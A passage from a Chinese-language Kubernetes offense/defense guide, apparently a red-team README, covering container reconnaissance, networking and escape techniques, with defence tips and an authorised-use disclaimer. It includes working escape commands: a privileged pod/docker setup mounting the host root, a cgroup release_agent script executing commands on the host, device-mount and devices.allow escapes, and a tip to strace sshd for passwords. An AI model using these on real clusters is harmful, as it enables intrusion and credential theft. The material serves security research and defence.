# 从零开始的Kubernetes攻防

本材料基于我原先在腾讯发表的博客 **《红蓝对抗中的云原生漏洞挖掘及利用实录》** 进行持续更新和完善，用于解决公众号无法及时勘误和调整的局限性；且由于Kubernetes安全特性、容器安全等场景的攻防技术在不断发展和改变，文章的内容也会持续不断的进行调整；并在后续会补充从零开始的实验环境搭建、Kubernetes安全特性对抗、完整红蓝对抗案例、EBPF安全等相关的内容。希望整理和囊括我在Kubecon、CloudNativeCon、HITB、BlackHat、WHC、CIS等会议上分享的云原生安全相关的议题，以及此前写过的所有相关文章；希望重新构建和整理自己的在 Kubernetes 上的知识体系。👁 *盼望能多积累勘误，沉淀一些真正有质量的内容。*

文件包括[WIP]：
1. [SLIDE](./slide/) - 近期发表的议题材料
2. [PAPER](./paper/) - 近期写的文章和白皮书汇总
3. [GIST](./gist/) - 文章和议题所用到的代码

|Security Conference|CNCF & Linux Foundation|
|-|-|
|<img src="./mdimg/20220521123149.png" height="45"> <img src="https://user-images.githubusercontent.com/7868679/221470671-2ac40157-a72e-44c6-83e8-8286e1c7db6c.png" height="45"> <img src="./mdimg/20220521230036.png" height="45"> <img src="./mdimg/20220521225818.png" height="45">|<img src="./mdimg/20220521115419.png" height="45">|
|HITB、 BlackHat (Arsenal)、 WHC、CIS ...|Kubecon & CloudNativeCon ...|
<table> 


## 0. 目录

- [从零开始的Kubernetes攻防](#从零开始的kubernetes攻防)
	- [0. 目录](#0-目录)
		- [0.5 测试环境建议](#05-测试环境建议)
	- [1. 背景](#1-背景)
	- [2. 攻防演练中的云原生安全](#2-攻防演练中的云原生安全)
	- [3. 单容器环境内的信息收集](#3-单容器环境内的信息收集)
	- [4. 容器网络](#4-容器网络)
	- [5. 关于逃逸的那些事](#5-关于逃逸的那些事)
		- [5.1. privileged 容器内 mount device](#51-privileged-容器内-mount-device)
		- [5.2. 攻击 lxcfs](#52-攻击-lxcfs)
		- [5.3. 创建 cgroup 进行容器逃逸](#53-创建-cgroup-进行容器逃逸)
		- [5.4. 特殊路径挂载导致的容器逃逸](#54-特殊路径挂载导致的容器逃逸)
		- [5.4.1 Docker in Docker](#541-docker-in-docker)
		- [5.4.2 攻击挂载了主机 /proc 目录的容器](#542-攻击挂载了主机-proc-目录的容器)
		- [5.5. SYS_PTRACE 安全风险](#55-sys_ptrace-安全风险)
		- [5.6. 利用大权限的 Service Account](#56-利用大权限的-service-account)
		- [5.7. CVE-2020-15257 利用](#57-cve-2020-15257-利用)
		- [5.8. runc CVE-2019-5736 和容器组件历史逃逸漏洞综述](#58-runc-cve-2019-5736-和容器组件历史逃逸漏洞综述)
		- [5.9. 内核漏洞提权和逃逸概述](#59-内核漏洞提权和逃逸概述)
		- [5.10. 写 StaticPod 逃逸或权限维持](#510-写-staticpod-逃逸或权限维持)
	- [6. 容器相关组件的历史漏洞](#6-容器相关组件的历史漏洞)
	- [7. 容器、容器编排组件 API 配置不当或未鉴权](#7-容器容器编排组件-api-配置不当或未鉴权)
		- [7.1. 组件分工](#71-组件分工)
		- [7.2. apiserver](#72-apiserver)
		- [7.3. kubelet](#73-kubelet)
		- [7.4. dashboard](#74-dashboard)
		- [7.5. etcd](#75-etcd)
		- [7.6. docker remote api](#76-docker-remote-api)
		- [7.7. kubectl proxy](#77-kubectl-proxy)
	- [8. 容器镜像安全问题](#8-容器镜像安全问题)
	- [9. 二次开发所产生的安全问题](#9-二次开发所产生的安全问题)
		- [9.1. 对 Kubernetes API 的请求转发或拼接](#91-对-kubernetes-api-的请求转发或拼接)
	- [10. Serverless](#10-serverless)
	- [10.1. 文件驻留导致命令执行](#101-文件驻留导致命令执行)
	- [10.2. 攻击公用容器 / 镜像](#102-攻击公用容器--镜像)
	- [11. DevOps](#11-devops)
	- [12. 云原生 API 网关](#12-云原生-api-网关)
	- [12.1. APISIX 的 RCE 利用](#121-apisix-的-rce-利用)
	- [13. 其它利用场景和手法](#13-其它利用场景和手法)
	- [13.1. 从 CronJob 谈持久化](#131-从-cronjob-谈持久化)
	- [14. 致谢](#14-致谢)
	- [15. 引用](#15-引用)

### 0.5 测试环境建议

测试环境的所有问题钱都能解决，我们可以直接在云厂商上购买一个包含多节点的 Kubernetes 容器集群；但如果只有一台VPS服务器或配置有限的虚拟机环境，那么我建议可以使用以下工具来搭建一个 Kubernetes 容器集群进行测试：

1. **Minikube**：适合单节点测试环境，可在本地虚拟机或云服务器上运行
   - 优点：安装简单，资源占用较少
   - 缺点：仅支持单节点，不适合测试集群功能
   - 安装命令：`curl -LO https://storage.googleapis.com/minikube/releases/latest/minikube-linux-amd64 && sudo install minikube-linux-amd64 /usr/local/bin/minikube`

2. **Kind (Kubernetes in Docker)**：在Docker容器中运行Kubernetes节点
   - 优点：可创建多节点集群，资源占用适中
   - 缺点：依赖Docker环境
   - 安装命令：`curl -Lo ./kind https://kind.sigs.k8s.io/dl/v0.18.0/kind-linux-amd64 && chmod +x ./kind && sudo mv ./kind /usr/local/bin/kind`

3. **K3s**：轻量级Kubernetes发行版，适合资源受限环境
   - 优点：资源占用极低，可在低配置环境运行
   - 缺点：精简了部分功能
   - 安装命令：`curl -sfL https://get.k3s.io | sh -`

4. **MicroK8s**：由Canonical开发的轻量级Kubernetes
   - 优点：安装简单，支持插件系统
   - 缺点：默认单节点，多节点配置较复杂
   - 安装命令：`sudo snap install microk8s --classic`

选择合适的工具取决于您的具体需求和资源限制。对于安全测试场景，建议在隔离的环境中进行，避免影响生产系统。

## 1. 背景

回顾近几年我在容器、Kubernetes上的探索和沉淀，我们在 2018 年的时候开始正式投入对 Serverless 和容器编排技术在攻防场景的预研，并把相关的沉淀服务于多个腾讯基础设施和产品之上，而在近期内外部的红蓝对抗演练中腾讯蓝军也多次依靠在云原生场景上的漏洞挖掘和漏洞利用，进而突破防御进入到内网或攻破核心靶标。  

本篇文章我们想聚焦于攻防对抗中所沉淀下来的漏洞，分享我们在多处攻防场景所遇到的云原生相关的漏洞挖掘和漏洞利用实例。

**注：本材料所有内容仅供安全研究和企业安全能力建设参考，请勿用于未授权渗透测试和恶意入侵攻击。**  

## 2. 攻防演练中的云原生安全

CNCF（云原生计算基金会 Cloud Native Computing Foundation）在对云原生定义的描述中提到 "云原生的代表技术包括容器、服务网格、微服务、不可变基础设施和声明式 API"；

我们今天所聊到的漏洞和利用手法也紧紧围绕着上述的几类技术和由云原生相关技术所演化出来的多种技术架构进行，包括但不限于容器、服务网格、微服务、不可变基础设施、声明式 API、无服务架构、函数计算、DevOps 等，并涉及研发团队在使用的一些云原生开源组件和自研、二次开发时常见的安全问题。不在 "云原生安全" 这个概念上做过多的延伸和扩展，且提及所有的安全漏洞都在 "腾讯蓝军" 对内对外的攻防演练和漏洞挖掘中有实际的利用经验积累。

在实际的攻防中我们所进行的攻击路径并非完全契合在 CIS2020 上总结的攻击模型：

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftBdfO2wkP8CxGyLPo3g9YnEbsMnrYicqc20yEgrxWVmdLEWUwue54Skw/640?wx_fmt=png)

因为大部分情况下我们遇到的内网并非完全基于容器技术所构建的，所以内网的起点并不一定是一个权限受限的容器，但攻击的方向和目标却大同小异：为了获取特定靶标的权限、资金和数据，我们一般需要控制更多乃至全部的容器、宿主机和集群。

也由于业界云原生实践的发展非常迅速，虽然进入内网之后我们所接触的不一定是全是 Kubernetes 所编排下的容器网络和架构，但基于云原生技术所产生的新漏洞和利用手法往往能帮蓝军打开局面。

举个例子，当我们通过远控木马获取某个集群管理员 PC 上的 kubeconfig 文件 （一般位于 ~/.kube/config 目录），此时我们就拥有了管理 Kubernetes 集群的所有能力了，具体能做的事情后面会有更详细的探讨。

如果此时该集群没有设置严格的 security policy 且目标企业的 HIDS 没有针对容器特性进行一定策略优化的话，那创建一个能获取 NODE 权限的 POD 或许就是一个不错的选择，因为只有这样获取的 shell 才能更方便的在容器宿主机上进行信息收集，例如 strace 宿主机 sshd 进程抓取我们想要的用户名和密码、使用 tcpdump 抓取节点流量获取管理员的登录态等。一般，正在线上运行的容器是没有这些权限的。

以下是这种情况下我们常用的 POD yaml 配置：

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftwCHtcUarg5Q2TibAGToyUjjicA79dtZD5WicGABfq5W5Td7yPAaRicHLqg/640?wx_fmt=png)

如果对 Kubernetes 的 POD 不熟悉，其实上述的配置就比较类似于在想要 ROOT 权限的业务服务器上执行以下 docker 命令:

```bash
docker -H ${host_docker_sock} run -d -it --name neartest_Kubernetes_hashsubix -v "/proc:/host/proc" -v "/sys:/host/sys" -v "/:/near_sandbox" --network=host --privileged=true --cap-add=ALL alpine:latest /bin/sh -c tail -f /dev/null
```

执行的结果和作用如下 (注：所有的挂载和选项并非都必须，实战中填写需要的权限和目录即可，此处提供一个较全的参考)：

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftgtxzp2bHN2wPiclVFXdjiaI3GThc2EllRLEjqhe5VhQNH4FDsz0srf8g/640?wx_fmt=png)

当然上述大部分配置都会被多租户集群下的 Kubernetes Security Policy 所拦截，且如果目前宿主机上的 HIDS 有一定容器安全能力的话，这类配置的容器创建行为也比较容易会被标记为异常行为。

不过，显然我们在真实的对抗中如果只是想达到执行 strace 抓取 sshd 的目的，配置可以更加简化一点，只需添加 SYS_PTRACE 的 capabilities 即可，如果需要抓取容器外的进程，可再添加一个 hostpid 。

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: ptrace-pod
spec:
  hostPID: true  # 允许访问宿主机进程
  containers:
  - name: ptrace-container
    image: alpine:latest
    command: ["sleep", "infinity"]
    securityContext:
      capabilities:
        add: ["SYS_PTRACE"]  # 添加SYS_PTRACE能力
```

因为具有 SYS_PTRACE 权限的容器并且进行 kubectl exec 的行为在实际的研发运维流程中非常常见，是 HIDS 比较不容易察觉的类业务型操作；另外也可以寻找节点上已有该配置的容器和 POD 进行控制，同样是不易被防御团队所察觉的。

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftEhyicH6Zpv2lsLiap7t9dLyM2r8QPyLrLaNvOpkmicQZZxwkltSsIiaaPA/640?wx_fmt=png)

接下来我们也会一个个讨论这类漏洞和手法和我们实际在对抗中遇到的场景。同时，无论是在 CNCF 对云原生的定义里，还是大家对云原生技术最直观的感受，大部分技术同学都会想到容器以及容器编排相关的技术，这里我们就以容器为起始，开启我们今天的云原生安全探索之旅吧~

## 3. 单容器环境内的信息收集

当我们获取了一个容器的 shell，或许 cat /proc/1/cgroup 是我们首要要执行的。

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftGKIPgDbCSJNK6zfH8HMBPGtTt0A7ofib1Ricj5SMtTmM01ItbDpwn8uA/640?wx_fmt=png)

毕竟从内核角度看容器技术的关键就是 CGroup 和 Namespace，或许应该再加一个 Capabilities。从 CGroup 信息中，不仅可以判断我们是否在容器内，也能很方便判断出当前的容器是否在 Kubernetes 的编排环境中。

没使用 Kubernetes 的 docker 容器，其 cgroup 信息长这样：

```
12:hugetlb:/docker/9df9278580c5fc365cb5b5ee9430acc846cf6e3207df1b02b9e35dec85e86c36
```

而 Kubernetes 默认的，长这样：

```
12:hugetlb:/kubepods/burstable/pod45226403-64fe-428d-a419-1cc1863c9148/e8fb379159f2836dbf990915511a398a0c6f7be1203e60135f1cbdc31b97c197
```

同时，这里的 CGroup 信息也是宿主机内当前容器所对应的 CGroup 路径，在后续的多个逃逸场景中获取 CGroup 的路径是非常重要的。

同类判断当前 shell 环境是否是容器，并采集容器内信息的还有很多，举个不完全的例子：


```bash
# 查看进程信息，容器内通常只有少量进程
ps aux

# 检查.dockerenv文件是否存在（Docker容器特有）
ls -l .dockerenv

# 查看当前容器的capabilities权限
capsh --print

# 检查是否在Kubernetes环境中
env | grep KUBE

# 查看Kubernetes相关秘密挂载
ls -l /run/secrets/kubernetes.io/

# 查看挂载信息
mount

# 查看磁盘使用情况
df -h

# 查看DNS配置
cat /etc/resolv.conf

# 查看挂载表
cat /etc/mtab

# 查看进程状态
cat /proc/self/status

# 查看进程挂载信息
cat /proc/self/mounts

# 查看Unix套接字
cat /proc/net/unix

# 查看挂载信息详情
cat /proc/1/mountinfo
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftPaEEMDapm7RgLEpRRPibpPezFWy7K4D44qhOs2UgdRENTicibzaCicFC2g/640?wx_fmt=png)

其中 `capsh --print` 获取到信息是十分重要的，可以打印出当前容器里已有的 Capabilities 权限。下面是一个典型的容器 Capabilities 输出示例：

```
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Ambient set =
Current IAB: !cap_dac_read_search,!cap_linux_immutable,!cap_net_broadcast,!cap_net_admin,!cap_ipc_lock,!cap_ipc_owner,!cap_sys_module,!cap_sys_rawio,!cap_sys_ptrace,!cap_sys_pacct,!cap_sys_admin,!cap_sys_boot,!cap_sys_nice,!cap_sys_resource,!cap_sys_time,!cap_sys_tty_config,!cap_lease,!cap_audit_control,!cap_mac_override,!cap_mac_admin,!cap_syslog,!cap_wake_alarm,!cap_block_suspend,!cap_audit_read
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
secure-no-ambient-raise: no (unlocked)
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftcgCLWayVj5MuKrHtibFOsoIsWrDc7Onr5cTbzIPXpafkq2hjnAv16Jg/640?wx_fmt=png)

但是，容器的 SHELL 环境里经常遇到无法安装新工具，且大部分常用工具都在镜像里被精简或阉割了。这时理解工具背后的原理并根据原理达到相同的效果就很重要。

以 capsh 为例，并非所有的容器镜像里都可以执行 capsh，这时如果想要获取当前容器的 Capabilities 权限信息，可以先 cat /proc/1/status 获取到 Capabilities hex 记录之后，再使用 capsh --decode 解码出 Capabilities 的可读字符串即可。

```bash
# 查看进程的Capabilities十六进制值
$ cat /proc/1/status | grep Cap
CapInh: 0000000000000000
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

# 使用capsh解码（如果可用）
$ capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSft1HBSRN9nBvtlv2iaVEWKYyYdEVx12K1qRjDGeOic5USvFXCaAx23RtvA/640?wx_fmt=png)

其他如 mount, lsof 等命令也类似，可以通过查看 /proc 目录下的文件获取相同信息。

另外一个比较常见就是 kubectl 命令的功能复现，很多情况下我们虽然获得了可以访问 APIServer 的网络权限和证书（又或者不需要证书）拥有了控制集群资源的权限，却无法下载或安装一个 kubectl 程序便捷的和 APIServer 通信，此时我们可以配置 kubectl 的 logging 级别，记录本地 kubectl 和测试 APIServer 的请求详情，并将相同的请求包发送给目标的 APIServer 以实现相同的效果。

```bash
kubectl create -f cronjob.yaml -v=8
```

如果需要更详细的信息，也可以提高 logging level, 例如 kubectl -v=10 等，其他 Kubernetes 组件也能达到相同的目的。日志输出示例：

```
I0712 12:09:05.044742   52540 round_trippers.go:420] GET https://kubernetes.default.svc:443/api?timeout=32s 200 OK in 5 milliseconds
I0712 12:09:05.044801   52540 round_trippers.go:420] POST https://kubernetes.default.svc:443/apis/batch/v1/namespaces/default/cronjobs 201 Created in 15 milliseconds
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSft3BicWNtm2RTCWS67EMSES3h6thcljtORdUEWb73W5ibvtHZOve5x18bw/640?wx_fmt=png)

## 4. 容器网络

以 Kubernetes 为例，容器与容器之间的网络是极为特殊的。虽然大部分经典 IDC 内网的手法和技巧依然可以使用，但是容器技术所构建起来的是全新的内网环境，特别是当企业引入服务网格等云原生技术做服务治理时，整个内网和 IDC 内网的差别就非常大了；因此了解一下 Kubernetes 网络的默认设计是非常重要的，为了避免引入复杂的 Kubernetes 网络知识，我们以攻击者的视角来简述放在蓝军面前的 Kubernetes 网络。

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftcXMH816vZg00WRsgnomrkInQYzToiaJU76Rv4wmF7x2srIEiaOXG4dJQ/640?wx_fmt=png)

从上图可以很直观的看出，当我们获取 Kubernetes 集群内某个容器的 shell，默认情况下我们可以访问以下几个内网里的目标：

1. 相同节点下的其它容器开放的端口

2. 其他节点下的其它容器开放的端口

3. 其它节点宿主机开放的端口

4. 当前节点宿主机开放的端口

5. Kubernetes Service 虚拟出来的服务端口

6. 内网其它服务及端口，主要目标可以设定为 APISERVER、ETCD、Kubelet 等


不考虑对抗和安装门槛的话，使用 masscan 和 nmap 等工具在未实行服务网格的容器网络内进行服务发现和端口探测和在传统的 IDC 网络里区别不大；当然，因为 Kubernetes Service 虚拟出来的服务端口默认是不会像容器网络一样有一个虚拟的 veth 网络接口的，所以即使 Kubernetes Service 可以用 IP:PORT 的形式访问到，但是是没办法以 ICMP 协议做 Service 的 IP 发现（Kubernetes Service 的 IP 探测意义也不大）。

另如果 HIDS、NIDS 在解析扫描请求时，没有针对 Kubernetes 的 IPIP Tunnle 做进一步的解析，可能产生一定的漏报。

注：若 Kubernetes 集群使用了服务网格，其中最常见的就是 istio，此时服务网格下的内网和内网探测手法变化是比较大的。可以参考引用中：《腾讯蓝军： CIS2020 - Attack in a Service Mesh》；由于 ISTIO 大家接触较少，此处不再展开。

也因此多租户集群下的默认网络配置是我们需要重点关注的，云产品和开源产品使用容器做多租户集群下的隔离和资源限制的实现并不少见，著名的产品有如 Azure Serverless、Kubeless 等。

若在设计多租户集群下提供给用户代码执行权限即容器权限的产品时，还直接使用 Kubernetes 默认的网络设计是不合理的且非常危险。

很明显一点是，用户创建的容器可以直接访问内网和 Kubernetes 网络。在这个场景里，合理的网络设计应该和云服务器 VPS 的网络设计一致，用户与用户之间的内网网络不应该互相连通，用户网络和企业内网也应该进行一定程度的隔离，上图中所有对内的流量路径都应该被切断。把所有用户 POD 都放置在一个 Kubernetes namespace 下就更不应该了。  

## 5. 关于逃逸的那些事

要更好的理解容器逃逸的手法，应该知道本质上容器内的进程只是一个受限的普通 Linux 进程，容器内部进程的所有行为对于宿主机来说是透明的，这也是众多容器 EDR 产品可以直接在主机或 SideCar 内做容器运行时安全的基础之一。

我们可以很容易在宿主机用 ps 看到容器进程信息：

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftq0qxLqTBAK3nWHNkMplc0oMG5sxyGVBhR93gDhEvtwGXKjeAQFuKIA/640?wx_fmt=png)

所以，容器逃逸的本质和硬件虚拟化逃逸的本质有很大的不同 (不包含 Kata Containers 等)，我的理解里容器逃逸的过程是一个受限进程获取未受限的完整权限，又或某个原本受 Cgroup/Namespace 限制权限的进程获取更多权限的操作，更趋近于提权。

而在对抗上，不建议将逃逸的行为当成可以写入宿主机特定文件 (如 /etc/cron*, /root/.ssh/authorized_keys 等文件) 的行为，应该根据目标选择更趋近与业务行为的手法，容器逃逸的利用手段会比大部分情况下的命令执行漏洞利用要灵活。

以目标 "获取宿主机上的配置文件" 为例，以下几种逃逸手法在容易在防御团队中暴露的概率从大到小，排序如下(部分典型手法举例，不同的 EDR 情况不同)：

1. mount /etc + write crontab  

2. mount /root/.ssh + write authorized_keys

3. old CVE/vulnerability exploit

4. write cgroup notify_on_release

5. write procfs core_pattern

6. volumeMounts: / + chroot

7. remount and rewrite cgroup

8. websocket/sock shell + volumeMounts: /path

我们来一一看一下利用场景和方法：  

### 5.1. privileged 容器内 mount device

使用 privileged 特权容器是业界最常见以及最广为人知的逃逸手法，对容器安全有一定要求的产品一般都会严格限制特权容器的使用和监控。不过依然会有一些著名的云产品犯类似的低级错误，例如微软的 Azure 出现的问题：  

https://thehackernews.com/2021/01/new-docker-container-escape-bug-affects.html

privileged 特权容器的权限其实有很多，所以也有很多不同的逃逸方式，挂载设备读写宿主机文件是特权容器最常见的逃逸方式之一。

当你进入 privileged 特权容器内部时，你可以使用 `fdisk -l` 查看宿主机的磁盘设备：

```bash
fdisk -l
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftGfNAXmbY6uvBia2ssPzWPZO09zlxyoeQfGY2Et96NickicqVYhYSLgibMA/640?wx_fmt=png)

如果不在 privileged 容器内部，是没有权限查看磁盘列表并操作挂载的。

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSft8w0dfp2xjr4r6BWKCfs5uKpR58aj9YqAsJZPR542xnKC56Tdmiczf1A/640?wx_fmt=png)

因此，在特权容器里，你可以把宿主机里的根目录 / 挂载到容器内部，从而去操作宿主机内的任意文件，例如 crontab config file, /root/.ssh/authorized_keys, /root/.bashrc 等文件，而达到逃逸的目的。

```bash
# 查看可用磁盘设备
fdisk -l

# 创建挂载点
mkdir /mnt/host_root

# 挂载宿主机根目录
mount /dev/sda1 /mnt/host_root

# 访问宿主机文件系统
ls -la /mnt/host_root
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSft2Q8Gdwwz7Kslf31TXMuUu1pPPnCHYGpCDibcltRdeGczics9V11EiaD5Q/640?wx_fmt=png)

当然这类的文件的读写是 EDR 和 HIDS 重点监控的对象，所以是极易触发告警的；即使 HIDS 不一定有针对容器安全的特性进行优化，对此类的逃逸行为依旧有一些检测能力。

**防御建议**：
- 避免使用 `--privileged` 特权容器，除非绝对必要
- 使用 Pod Security Policies (PSP) 或 Pod Security Standards (PSS) 限制容器权限
- 实施最小权限原则，仅授予容器所需的最小权限
- 监控特权容器的创建和使用情况

### 5.2. 攻击 lxcfs

lxcfs 的场景和手法应该是目前业界 HIDS 较少进行覆盖的，我们目前也未在真实的攻防场景中遇到 lxcfs 所导致的容器逃逸利用，学习到这个有趣的场景主要还是来自于 @lazydog 师傅在开源社区和私聊里的分享，他在自己的实际蓝军工作中遇到了 lxcfs 的场景，并调研文档和资料构建了一套相应的容器逃逸思路；由此可见，这个场景和手法在实际的攻防演练中也是非常有价值的。

lxcfs： https://linuxcontainers.org/lxcfs/

假设业务使用 lxcfs 加强业务容器在 /proc/ 目录下的虚拟化，以此为前提，我们构建出这样的 demo pod:

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSft1G5hEGn2nOicDpFookOYNsyicbG6RARkn8o9licXQRlhpNooetfuzqBNA/640?wx_fmt=png)

并使用 `lxcfs /data/test/lxcfs/` 修改了 data 目录下的权限。若蓝军通过渗透控制的是该容器实例，则就可以通过下述的手法达到逃逸访问宿主机文件的目的，这里简要描述一下关键的流程和原理。

（1）首先在容器内，蓝军需要判断业务是否使用了 lxcfs，在 mount 信息里面可以进行简单判断，当然容器不一定包含 mount 命令，也可以使用 cat /proc/1/mountinfo 获取

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftqyVYKOTgP0AoQNODZ1K4HIZCmIVEY26jluyICLqtt7KqaJzx2SnpCg/640?wx_fmt=png)

（2）此时容器内会出现一个新的虚拟路径：

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftv1x875RksBQzoI6fufzz26pmIYOvumjBUg1Lq6NXCCjfgqHn8K4AIw/640?wx_fmt=png)

（3）更有趣的是，该路径下会绑定当前容器的 devices subsystem cgroup 进入容器内，且在容器内有权限对该 devices subsystem 进行修改。

使用 echo a > devices.allow 可以修改当前容器的设备访问权限，致使我们在容器内可以访问所有类型的设备。

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftlHhr7YzFOqx19KDYSy28icQTXFmWKdeZkjYSCpao7CU3LX63kvSds5g/640?wx_fmt=png)

（4）如果跟进过 CVE-2020-8557 这个具有 Kubernetes 特色的拒绝服务漏洞的话，应该知道

/etc/hosts， /dev/termination-log，/etc/resolv.conf， /etc/hostname 这四个容器内文件是由默认从宿主机挂载进容器的，所以在他们的挂载信息内很容易能获取到主设备号 ID。

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftaDwpX3m03LqY7DkaWfzPOFB57iatun8yhuOJODZtXDO1SoR07LYTRKg/640?wx_fmt=png)

（5）我们可以使用 mknod 创建相应的设备文件目录并使用 debugfs 进行访问，此时我们就有了读写宿主机任意文件的权限。

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftwacESL1sXDo8ZDKpia4qGyyibXtqtQbcSIh95DCRgjpuXYIoJTIly3Gw/640?wx_fmt=png)

这个手法和利用方式不仅可以作用于 lxcfs 的问题，即使没有安装和使用 lxcfs，当容器为 privileged、sys_admin 等特殊配置时，可以使用相同的手法进行逃逸。我们曾经多次使用类似的手法逃逸 privileged、sys_admin 的场景 (在容器内 CAPABILITIES sys_admin 其实是 privileged 的子集)，相较之下会更加隐蔽。

当然自动化的工具可以帮我们更好的利用这个漏洞并且考虑容器内的更多情况，这里自动化 EXP 可以使用 CDK 工具 (该工具由笔者 neargle 和 CDXY 师傅一同研发和维护，并正在持续迭代中)：

https://github.com/cdk-team/CDK/wiki/Exploit:-lxcfs-rw

逃逸章节所使用的技巧很多都在 CDK 里有自动化的集成和实现。

**防御建议**：
- 避免在生产环境中使用 lxcfs
- 如必须使用，确保容器没有权限修改 devices cgroup
- 实施严格的容器安全策略，限制容器的权限
- 定期审计容器配置，确保没有不必要的权限

### 5.3. 创建 cgroup 进行容器逃逸

上面提到了 privileged 配置可以理解为一个很大的权限集合，可以直接 mount device 并不是它唯一的权限和利用手法，另外一个比较出名的手法就是利用 cgroup release_agent 进行容器逃逸以在宿主机执行命令，这个手法同样可以作用于 sys_admin 的容器。

shell 利用脚本如下（bash 脚本参考： [https://github.com/neargle/cloud_native_security_test_case/blob/master/privileged/1-host-ps.sh](https://github.com/neargle/cloud_native_security_test_case/blob/master/privileged/1-host-ps.sh)）：

```bash
#!/bin/bash

# 在容器内创建一个临时目录
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

# 启用cgroup通知机制
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

# 创建要在宿主机上执行的命令
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd

# 触发release_agent
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftEWoZ2qyfQR8GX93YnMXf5adbPsONoOGjWgdznasxJdciaib9PNHZVrDQ/640?wx_fmt=png)


输出示例：  

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftd0OAOT3fzaDQCAlAaIRQSgEWIol1sKbUxz1Ttg9BxcCMcpLcw46jcA/640?wx_fmt=png)

其中

```bash
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab` 
```

的做法经常在不同的 Docker 容器逃逸 EXP 被使用到；如果我们在漏洞利用过程中，需要在容器和宿主机内进行文件或文本共享，这种方式是非常棒且非常通用的一个做法。

其思路在于利用 Docker 容器镜像分层的文件存储结构 (Union FS)，从 mount 信息中找出宿主机内对应当前容器内部文件结构的路径；则对该路径下的文件操作等同于对容器根目录的文件操作。

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftiauaaBrb6vQiarVSQpAfSdVPiaqxX6ibhHGvFWruakuTM85UIYQ40J6TZQ/640?wx_fmt=png)

此类手法如果 HIDS 并未针对容器逃逸的特性做一定优化的话，则 HIDS 对于逃逸在母机中执行命令的感知能力可能就会相对弱一点。不过业界的 EDR 和 HIDS 针对此手法进行规则覆盖的跟进速度也很快，已有多款 HIDS 对此有一定的感知能力。

另外一个比较小众方法是借助上面 lxcfs 的思路，复用到 sys_admin 或特权容器的场景上读写宿主机上的文件。（腾讯蓝军的兄弟们问得最多的手法之一，每过一段时间就有人过来问一次 ~）

1. 首先我们还是需要先创建一个 cgroup 但是这次是 device subsystem 的。

```bash
mkdir /tmp/dev
mount -t cgroup -o devices devices /tmp/dev/
```

2. 修改当前已控容器 cgroup 的 devices.allow，此时容器内已经可以访问所有类型的设备

命令： 
```bash
echo a > /tmp/dev/docker/b76c0b53a9b8fb8478f680503164b37eb27c2805043fecabb450c48eaad10b57/devices.allow
```

